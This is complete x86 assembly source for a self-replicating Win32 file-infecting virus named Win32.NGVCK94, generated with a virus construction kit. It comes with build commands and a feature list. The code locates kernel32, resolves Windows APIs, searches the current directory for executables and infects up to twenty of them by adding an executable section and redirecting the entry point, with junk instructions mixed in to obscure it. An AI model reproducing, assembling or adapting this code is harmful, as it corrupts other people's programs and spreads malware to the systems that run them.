              
;
;
; Win32.NGVCK94 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK94
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 23
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 41410 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop eax
 sub eax, offset Delta
 neg edx                                ; Trash
                                        ; mov ebp, eax
 mov ebp, eax
 jmp KernelSearchStart


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 and ecx, 41872278d                     ; Trash
 push 1
 mov ecx, 80000000h or 40000000h
 push ecx
 lea esi, [ebp+WFD_szFileName]
 xchg eax, esi

 push eax
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 shr edx, 11d                           ; Trash
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop ecx
 test eax, eax
 jz CloseFile
 push ecx
 push 0
 push 0
                                        ; mov ebx, 2
 push 2d
 pop ebx
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; ebx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear edi
 mov edi, 8977d
 sub edi, 8977d
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 xor ecx, ecx
 add ecx, [edi+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 dec ecx
 add ecx, 29d
                                        ; get ATableVA
 mov edi, dword ptr [ecx]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [ecx]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [ecx]
 sar eax, 7d                            ; Trash
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
                                        ; mov ecx, -1
 mov ecx, ( -1d + 1d )
 sub ecx, 1d
 and ecx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 and word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], -1
 and dword ptr [ebp+NTableTemp], ecx
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
                                        ; mov ecx, eax
 mov ecx, eax
                                        ; mov esi, ecx
 push ecx
 pop esi
 push edx
 add eax, 60144144d                     ; Trash
 push esi
 push ebx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ah, byte ptr [esi]
 sub dword ptr [ebp+Trash1], ecx        ; Trash
 cmp ah, byte ptr [ebx]
 jne ApiNotFound
 dec edx
 shr eax, 29d                           ; Trash
 sub edx, 1
 add edx, 1
 jz FoundApi1
                                        ; add ebx, 1
 inc ebx
 and eax, 92377250d                     ; Trash
                                        ; add esi, 1
 sub esi, -1d
 jmp ApiCompareLoop
 dec dword ptr [ebp+Trash1]             ; Trash

ApiNotFound:                            ; we did not find it :(
 pop ebx
 pop esi
 shr eax, 8d                            ; Trash
 pop edx
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+NTableTemp]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 xchg ecx, eax
 movzx ecx, word ptr [eax]
 sal ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ecx]
 add eax, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop ebx
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je Goodfile
                                        ; mov edx, 2853
 mov edx, ( 2853d - 31d )
 add edx, 31d
 cmp edx, 0
 jne Notagoodfile
Goodfile:
                                        ; clear edx
 mov edx, 12080d
 sub edx, 12080d
 mov dx, word ptr [ebx+3Ch]
                                        ; add edx, 1
 sub edx, -1d
 dec edx
 jz Notagoodfile
 push dword ptr [ebx+3Ch]
 pop eax
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],eax
 jb Notagoodfile
 add eax, ebx
 sal ecx, 28d                           ; Trash
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
                                        ; mov edx, 24661
 mov edx, ( 24661d - 16d )
 add edx, 16d
 cmp edx, 24661d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection
 neg edx                                ; Trash

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov esi, offset WIN32_FIND_DATA
 add esi, ebp

 push esi
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg eax, esi

 push eax
 push dword ptr [ebp+FindHandle]
 pop ebx
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, 276d
 lea edi, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 inc edi
 dec edx
 jnz ClearOldData2
 popad
ret





;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edi, [ebp+filemask]
 xchg edx, edi

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 test eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear edx
 xor edx, edx
 xor edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 push 0
 pop edx
 div ebx
                                        ; add eax, 1
 inc eax
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 and edx, edx                           ; Trash
                                        ; mov ecx, -1
 mov ecx, 0
 add ecx, -1d
 and ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [ecx+3Ch]
 add eax, ecx
                                        ; get File Alignment
 mov edx, [eax+3Ch]
 mov dword ptr [ebp+filealign], edx
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], ecx
                                        ; get old Entrypoint
 mov eax, dword ptr [ecx+34h]
 mov dword ptr [ebp+OldBase], eax
 mov eax, dword ptr [ecx+28h]
 push eax
 pop dword ptr [ebp+OldEIP]
 mov ebx, [ecx+38h]
 mov dword ptr [ebp+sectionalign], ebx
                                        ; Get last section
 mov eax, [ecx+74h]
 shl eax, 3
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [ecx+6h]
 mov edx, 28h
 pushad
 mov eax, ebx
 mul edx
 mov dword ptr [ebp+Misc1], eax
 popad
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+Misc1]
 add ecx, 78h
 add ecx, eax
 add ecx, ebx
 mov edx, ebp
 add edx, offset newsection
 and dword ptr [ebp+Trash1], 1364585    ; Trash


 xchg edx, ecx
 push edx
                                        ; Calculate the RVA of the new section
 mov ecx, [edx-5*8+8d]
 add ecx, [edx-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+nsphysicalsize], 0
 xor dword ptr [ebp+nsphysicalsize], ecx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop eax
 mov dword ptr [ebp + offset nsRVA], eax
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], -1
 and dword ptr [ebp+nsvirtualsize], ebx
                                        ; calculate physical offset
 mov eax,[edx-5*8+20d]
 add eax,[edx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; mov edx, -1
 push -1d
 pop edx
 and edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+filealign]
 mov ecx, edx
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ebx
 shl edx, 29d                           ; Trash
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 pop edx
 lea ebx, [ebp+newsection]
 and dword ptr [ebp+Trash1], 384233     ; Trash

                                        ; mov eax, 64
 mov eax, 0
 add eax, 64d
WriteNewSectionLoop:
 mov ch, byte ptr [ebx]
 mov byte ptr [edx], ch
 add eax, -1
                                        ; add ebx, 1
 inc ebx
                                        ; add edx, 1
 inc edx
 test eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov ebx, dword ptr [ebp+PEheader]
 add word ptr [ebx+06h], 1
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [ebx+28h], eax
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], 0h
 add dword ptr [ebx+4Ch], 'NGVC'
                                        ; mov eax, -1
 mov eax, ( -1d - 8d )
 add eax, 8d
 and eax, dword ptr [ebp+nsphysicaloffset]
 push eax
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus
 sal ecx, 12d                           ; Trash

 mov edx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 sub eax, 1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 sectionalign   dd 0h
 OldBase     dd 400000h
 MapHandle   dd 0h
 Misc1       dd 0h
 KernelMZ    dd 0h
 TempAPI     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 OldEIP      dd 0h
 AlignReg1   dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 NTableVA    dd 0h
 KernelPE    dd 0h
 NTableTemp  dd 0h
 InfCounter  dd 0h
 MapAddress  dd 0h
 Trash1      dd 0h
 K32Trys     dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h

 db 'Win32.NGVCK94 by SnakeByte',0
 filemask    db '*.exE',0

 APINames:
 db 11d, 'CloseHandle'
 db 14d, 'FindFirstFileA'
 db 11d, 'CreateFileA'
 db 13d, 'MapViewOfFile'
 db 18d, 'CreateFileMappingA'
 db 13d, 'FindNextFileA'
 db 15d, 'UnmapViewOfFile'
 db 09d, 'FindClose'

 ATableVA    dd 0h
 AlignReg2   dd 0h
 counter     dw 0h
 filealign   dd 0h
 FindHandle  dd 0h

 Trash2      dd 0h
 PEheader    dd 0h
 NewEIP      dd 0h
 FileHandle  dd 0h
 OTableVA    dd 0h
 NewSize     dd 0h




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], ebx

                                        ; clear esi
 and esi, 0
 add esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi



ExecuteHost:                            ; Start the infected File
 sal ecx, 27d                           ; Trash

                                        ; check if we are first generation
 dec ebp
 inc ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ecx
 mov ecx, -7685d
 add ecx, 7685d
 add ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea edx, [ebp+APIOffsets]
 xchg edx, edi

 lea edx, [ebp+APINames]
 xchg edx, ebx


GetApisLoop: 

                                        ; clear edx
 mov edx, 43175d
 sub edx, 43175d
 mov dl, byte ptr [ebx]
                                        ; add ebx, 1
 add ebx, 1d

                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; ebx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
 add ebx, edx
                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], eax
                                        ; add edi, 4
 dec edi
 add edi, 5d
 dec ecx
 jnz GetApisLoop
 jmp Outbreak



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
 neg eax                                ; Trash
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ebx
 push ebx
                                        ; round to pages
 sub bx, bx
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 6h
                                        ; store old EIP and ImageBase
                                        ; clear edi
 mov edi, 0
 xor edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edi

 push dword ptr [ebp+OldBase]
 xor edx, ebx                           ; Trash
 pop esi

 and ecx, 12342517d                     ; Trash
 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], esi



GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je CheckPE

GK2:
 sub ebx, 65536d
 shr edx, 12d                           ; Trash
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+K32Trys]
 dec eax
 mov dword ptr [ebp+K32Trys], eax
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 adc dword ptr [ebp+Trash1], 233511     ; Trash
                                        ; add ebx, 60
 inc ebx
 add ebx, 59d
 mov esi, [ebx]
 dec ebx
 sub ebx, 59d
 neg ebx
 sub esi, ebx
 neg ebx
                                        ; check for EP
 movzx eax, word ptr [esi]
 sub eax, 'EP'
 jz CheckDLL
 mov ecx, edx                           ; Trash
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelMZ], -1
 and dword ptr [ebp+KernelMZ], ebx
 mov dword ptr [ebp+KernelPE], 0
 xor dword ptr [ebp+KernelPE], esi

 jmp GetApis

CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 mov edx, 22141d
 sub edx, 22141d
 push edx
 call ExitProcess



end FakeCode

